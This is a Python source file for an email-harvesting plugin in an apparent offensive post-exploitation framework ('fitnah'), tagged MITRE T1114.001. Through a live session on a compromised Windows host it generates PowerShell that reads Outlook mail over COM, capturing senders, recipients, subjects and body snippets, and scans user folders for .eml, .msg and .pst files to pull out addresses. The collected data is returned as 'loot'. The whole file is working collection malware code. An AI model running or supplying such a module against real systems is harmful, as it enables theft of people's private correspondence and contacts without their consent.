"""collection/email_harvest — Outlook COM + file-based email harvesting. MITRE T1114.001"""
import base64
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class EmailHarvest(BasePlugin):
    NAME        = "email_harvest"
    DESCRIPTION = "Harvest emails via Outlook COM (all folders) + file-based .eml/.msg scan. Filters by keyword/days."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1114.001"
    CATEGORY    = "collection"
    schema      = ParamSchema().add(
        Param("method",      str, required=False, default="auto",
              help="auto | outlook | files. auto tries Outlook first, falls back to files"),
        Param("keyword",     str, required=False, default="",
              help="Filter emails by keyword in subject or body"),
        Param("since_days",  int, required=False, default=30,
              help="Only return emails from the last N days (0=all)"),
        Param("max_emails",  int, required=False, default=50,
              help="Maximum emails to return (default 50)"),
        Param("folders",     str, required=False, default="Inbox,SentItems",
              help="Comma-separated Outlook folder names (default: Inbox,SentItems)"),
        Param("path",        str, required=False, default="C:\\Users",
              help="Root path for file-based search"),
    )

    @mitre("T1114.001")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        method     = params.get("method",     "auto").lower()
        keyword    = params.get("keyword",    "").replace("'", "''")
        since_days = params.get("since_days", 30)
        max_emails = params.get("max_emails", 50)
        folders    = params.get("folders",    "Inbox,SentItems")
        path       = params.get("path",       "C:\\Users")

        folder_list = ",".join(f"'{f.strip()}'" for f in folders.split(","))

        outlook_block = (
            "$results=@();"
            "try {"
            "  $ol=New-Object -ComObject Outlook.Application -EA Stop;"
            "  $ns=$ol.GetNamespace('MAPI');"
            f"  $fnames=@({folder_list});"
            "  foreach ($fn in $fnames) {"
            "    try {"
            "      $fldr=$ns.GetDefaultFolder([Microsoft.Office.Interop.Outlook.OlDefaultFolders]::$(if($fn -eq 'Inbox'){6}else{5}));"
            "      foreach ($mail in $fldr.Items) {"
            "        try {"
            f"          $cutoff=(Get-Date).AddDays(-{since_days});"
            f"          if ({since_days} -gt 0 -and $mail.ReceivedTime -lt $cutoff){{continue}};"
            f"          if ('{keyword}' -ne '' -and ($mail.Subject+$mail.Body) -notmatch '{keyword}'){{continue}};"
            "          $results += [PSCustomObject]@{"
            "            Folder=$fn; From=$mail.SenderEmailAddress; To=$mail.To;"
            "            Subject=$mail.Subject; Received=$mail.ReceivedTime;"
            "            BodySnip=$mail.Body.Substring(0,[Math]::Min(200,$mail.Body.Length))"
            "          };"
            f"          if($results.Count -ge {max_emails}){{break}}"
            "        } catch {}"
            "      }"
            "    } catch {}"
            "  };"
            "  if($results.Count -gt 0){"
            "    $results|ForEach-Object{\"[MAIL] From:$($_.From) To:$($_.To)\"; \"  Subject: $($_.Subject)\"; \"  Recv: $($_.Received)\"; \"  Body: $($_.BodySnip)\"; ''}"
            "  } else { 'No emails found via Outlook COM' }"
            "} catch { 'Outlook COM failed: ' + $_ }"
        )

        file_block = (
            "$exts=@('*.eml','*.msg','*.pst');"
            "$results2=@();"
            f"Get-ChildItem '{path}' -Recurse -Include $exts -EA SilentlyContinue | Select-Object -First 200 |"
            "  ForEach-Object {"
            f"    if({since_days} -gt 0 -and $_.LastWriteTime -lt (Get-Date).AddDays(-{since_days})){{return}};"
            "    $content=Get-Content $_.FullName -Raw -EA SilentlyContinue;"
            f"    if('{keyword}' -ne '' -and $content -notmatch '{keyword}'){{return}};"
            "    $emails=[regex]::Matches($content,'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}')"
            "      |Select-Object -ExpandProperty Value -Unique;"
            "    if($emails){"
            "      $results2 += \"[FILE] $($_.FullName): $($emails -join ', ')\";"
            f"      if($results2.Count -ge {max_emails}){{break}}"
            "    }"
            "  };"
            "if($results2){$results2 -join \"`n\"}else{'No email files found'}"
        )

        if method == "outlook":
            ps = outlook_block
        elif method == "files":
            ps = file_block
        else:  # auto
            ps = outlook_block + "\n" + file_block

        r = ctx.ps(ps)
        if r["status"] not in ("ok", "error"):
            return ModuleResult.err("Dispatch failed")
        return ModuleResult.ok(data=r["output"], loot_kind="email")
